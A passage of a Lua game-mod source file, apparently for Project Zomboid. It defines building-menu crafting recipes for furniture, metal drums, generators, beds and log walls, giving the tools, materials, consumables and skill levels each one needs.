            "Screwdriver",
            "Saw",
            "WeldingMask"
        },
        neededMaterials = {
            {
                Material = 'Base.MetalBar',
                Amount = BuildingMenu.round(metalBarsCount*1.25)
            },
            {
                Material = 'Base.RippedSheets',
                Amount = 30
            },
            {
                Material = 'Base.Screws',
                Amount = screwsCount
            }
        },
        useConsumable = {
            {
                Consumable = 'Base.BlowTorch',
                Amount = 5
            },
            {
                Consumable = "Base.WeldingRods",
                Amount = BuildingMenu.weldingRodUses(5)
            }
        },
        skills = {
            {
                Skill = "MetalWelding",
                Level = 3,
                Xp = BuildingMenu.round(3*metalweldingXpPerLevel)
            }
        }
    }


    BuildingMenu.MetalDrumRecipe = {
        neededTools = {
            "BlowTorch",
            "WeldingMask"
        },
        neededMaterials = {
            {
                Material = "Base.SheetMetal",
                Amount = 15
            },
            {
                Material = "Base.SmallSheetMetal",
                Amount = 10
            },
            {
                Material = 'Base.Screws',
                Amount = BuildingMenu.round(screwsCount*2)
            }
        },
        useConsumable = {
            {
                Consumable = 'Base.BlowTorch',
                Amount = 10
            },
            {
                Consumable = "Base.WeldingRods",
                Amount = BuildingMenu.weldingRodUses(10)
            },
        },
        skills = {
            {
                Skill = "MetalWelding",
                Level = 7,
                Xp = BuildingMenu.round(7*metalweldingXpPerLevel)
            }
        }
    }

    BuildingMenu.GeneratorRecipe = {
        neededTools = {
            "BlowTorch",
            "Screwdriver",
            "Saw",
            "WeldingMask"
        },
        neededMaterials = {
            {
                Material = "Base.SheetMetal",
                Amount = BuildingMenu.round(sheetMetalCountForFixturesAndAppliances*1.25)
            },
            {
                Material = "Base.ElectronicsScrap",
                Amount = 100
            },
            {
                Material = "Radio.ElectricWire",
                Amount = 4
            },
            {
                Material = "Base.Aluminum",
                Amount = 12
            },
            {
                Material = 'Base.Screws',
                Amount = BuildingMenu.round(screwsCount*2)
            }
        },
        useConsumable = {
            {
                Consumable = 'Base.BlowTorch',
                Amount = 5
            },
            {
                Consumable = "Base.WeldingRods",
                Amount = BuildingMenu.weldingRodUses(5)
            }
        },
        skills = {
            {
                Skill = "MetalWelding",
                Level = 3,
                Xp = BuildingMenu.round(3*metalweldingXpPerLevel)
            },
            {
                Skill = "Electricity",
                Level = 4,
                Xp = BuildingMenu.round(4*electricalXpPerLevel)
            }
        }
    }

    BuildingMenu.SmallFurnitureRecipe = {
        neededTools = {
            "Hammer"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = smallObjectsWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = smallObjectsNailsCount
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = BuildingMenu.round(smallObjectsCarpentrySkill*0.5),
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.LargeFurnitureRecipe = {
        neededTools = {
            "Hammer"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = BuildingMenu.round(bigObjectsWoodCount*1.25)
            },
            {
                Material = "Base.Nails",
                Amount = bigObjectsNailsCount
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.LargeGlassFurnitureRecipe = {
        neededTools = {
            "Hammer"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = BuildingMenu.round(bigObjectsWoodCount*1.25)
            },
            {
                Material = "Base.GlassPane",
                Amount = BuildingMenu.round(glassPaneCount * 1.5)
            },
            {
                Material = "Base.Nails",
                Amount = bigObjectsNailsCount
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.BedRecipe = {
        neededTools = {
            "Hammer"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = BuildingMenu.round(bigObjectsWoodCount*1.5)
            },
            {
                Material = "Base.Nails",
                Amount = bigObjectsNailsCount
            },
            {
                Material = "Base.Mattress",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.DoubleBedRecipe = {
        neededTools = {
            "Hammer"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = BuildingMenu.round(bigObjectsWoodCount*2)
            },
            {
                Material = "Base.Nails",
                Amount = BuildingMenu.round(bigObjectsNailsCount*1.5)
            },
            {
                Material = "Base.Mattress",
                Amount = 2
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = BuildingMenu.round(bigObjectsCarpentrySkill*1.25),
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.LeatherFurnitureRecipe = {
        neededTools = {
            "Hammer"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = BuildingMenu.round(bigObjectsWoodCount*1.5)
            },
            {
                Material = "Base.LeatherStrips",
                Amount = 20
            },
            {
                Material = "Base.Nails",
                Amount = bigObjectsNailsCount
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = BuildingMenu.round(bigObjectsCarpentrySkill*1.25),
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.CouchRecipe = {
        neededTools = {
            "Hammer",
            "Needle"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = BuildingMenu.round(bigObjectsWoodCount*1.5)
            },
            {
                Material = "Base.RippedSheets",
                Amount = 20
            },
            {
                Material = "Base.Nails",
                Amount = bigObjectsNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.Thread",
                Amount = 10
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = BuildingMenu.round(bigObjectsCarpentrySkill*1.25),
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            },
            {
                Skill = "Tailoring",
                Level = 4,
                Xp = 10
            }
        }
    }

    BuildingMenu.PaddedChairRecipe = {
        neededTools = {
            "Hammer",
            "Needle"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = smallObjectsWoodCount
            },
            {
                Material = "Base.RippedSheets",
                Amount = 10
            },
            {
                Material = "Base.Nails",
                Amount = smallObjectsNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.Thread",
                Amount = 5
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            },
            {
                Skill = "Tailoring",
                Level = 2,
                Xp = 10
            }
        }
    }

    BuildingMenu.WoodenChairRecipe = {
        neededTools = {
            "Hammer"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = smallObjectsWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = smallObjectsNailsCount
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.MetalChairRecipe = {
        neededTools = {
            "BlowTorch",
            "Screwdriver",
            "Saw",
            "WeldingMask"
        },
        neededMaterials = {
            {
                Material = 'Base.MetalBar',
                Amount = metalBarsCount
            },
            {
                Material = "Base.SheetMetal",
                Amount = BuildingMenu.round(sheetMetalCountForRoofingAndFloors*3)
            },
            {
                Material = "Base.RippedSheets",
                Amount = 10
            },
            {
                Material = 'Base.Screws',
                Amount = BuildingMenu.round(screwsCount*2)
            }
        },
        useConsumable = {
            {
                Consumable = 'Base.BlowTorch',
                Amount = 5
            },
            {
                Consumable = "Base.WeldingRods",
                Amount = BuildingMenu.weldingRodUses(5)
            }
        },
        skills = {
            {
                Skill = "MetalWelding",
                Level = 3,
                Xp = BuildingMenu.round(3*metalweldingXpPerLevel)
            }
        }
    }


    BuildingMenu.BigLogWallRecipe = {
        neededTools = {
            "Hammer"
        },
        neededMaterials = {
            {
                Material = "Base.Log",
                Amount = BuildingMenu.round(bigWallWoodCount*0.75)
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.SmallLogWallRecipe = {
        neededTools = {
            "Hammer"
        },
        neededMaterials = {
            {
                Material = "Base.Log",
                Amount = BuildingMenu.round(smallWallWoodCount*0.75)
            },
            {
                Material = "Base.Nails",
                Amount = BuildingMenu.round(smallWallNailsCount*1.25)
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = BuildingMenu.round(smallObjectsCarpentrySkill*0.75),
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }


    BuildingMenu.PrimitveBedRecipe = {
        neededTools = {
            "Hammer"
        },
        neededMaterials = {
            {
                Material = "Base.Log",
                Amount = BuildingMenu.round(smallObjectsWoodCount*0.75)
            },
            {
                Material = "Base.Nails",
                Amount = BuildingMenu.round(smallObjectsNailsCount*0.75)
            },
            {
                Material = "Base.Twigs",
                Amount = 10
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = BuildingMenu.round(smallObjectsCarpentrySkill*0.75),
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }
end

Events.OnInitGlobalModData.Add(function()
	initBuildingMenuRecipes()
end)